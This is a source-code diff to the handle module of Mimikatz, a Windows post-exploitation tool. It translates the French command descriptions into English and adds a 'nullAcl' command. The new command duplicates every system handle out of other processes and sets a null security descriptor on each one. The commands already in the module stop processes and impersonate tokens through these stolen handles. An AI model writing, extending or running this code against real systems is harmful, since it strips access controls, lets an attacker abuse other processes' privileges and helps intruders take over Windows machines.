@@ -8,9 +8,10 @@
 vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_handle::getMimiKatzCommands()
 {
 	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(list,				L"list",				L"Affiche les handles du système (pour le moment juste les processus et tokens)"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(processStop,			L"processStop",			L"Essaye de stopper un ou plusieurs processus en utilisant d\'autres handles"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(tokenImpersonate,	L"tokenImpersonate",	L"Essaye d\'impersonaliser un token en utilisant d\'autres handles"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(list,				L"list",				L"Displays the system handles (for now just processes and tokens)"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(processStop,			L"processStop",			L"Trying to stop one or more processes using other handles"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(tokenImpersonate,	L"tokenImpersonate",	L"Try to impersonate token using other handles"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(nullAcl,				L"nullAcl",				L"Set a null ACL on Handles"));
 	return monVector;
 }
 
@@ -248,6 +249,42 @@ bool mod_mimikatz_handle::tokenImpersonate(vector<wstring> * arguments)
 								delete processHote;
 							}
 						}
+					}
+					CloseHandle(nouveauHandle);
+				}
+				CloseHandle(hProcess);
+			}
+		}
+	}
+	else wcout << L"mod_system::getSystemHandles ; " << mod_system::getWinError() << endl;
+
+	delete mesHandles;
+
+	return true;
+}
+
+bool mod_mimikatz_handle::nullAcl(vector<wstring> * arguments)
+{
+	vector<SYSTEM_HANDLE> * mesHandles = new vector<SYSTEM_HANDLE>();
+	if(mod_system::getSystemHandles(mesHandles))
+	{
+		for(vector<SYSTEM_HANDLE>::iterator monHandle = mesHandles->begin(); monHandle != mesHandles->end(); monHandle++)
+		{
+			HANDLE hProcess;
+			if(hProcess = OpenProcess(PROCESS_DUP_HANDLE, false, monHandle->ProcessId))
+			{
+				HANDLE nouveauHandle;
+				if(DuplicateHandle(hProcess, reinterpret_cast<HANDLE>(monHandle->Handle), GetCurrentProcess(), &nouveauHandle, 0, false, DUPLICATE_SAME_ACCESS))
+				{
+					wstring tokenType;
+					if(mod_system::getHandleType(nouveauHandle, &tokenType))
+					{
+						bool toACL = true;;
+						if(!arguments->empty())
+							toACL = find(arguments->begin(), arguments->end(), tokenType) != arguments->end();
+						
+						if(toACL)
+							wcout << monHandle->ProcessId << L'\t' << monHandle->Handle << L'\t' << tokenType << L"\t\t" << (mod_secacl::nullSdToHandle(&nouveauHandle) ? L"NULL !" : L"KO") << endl;
 					}
 					CloseHandle(nouveauHandle);
 				}
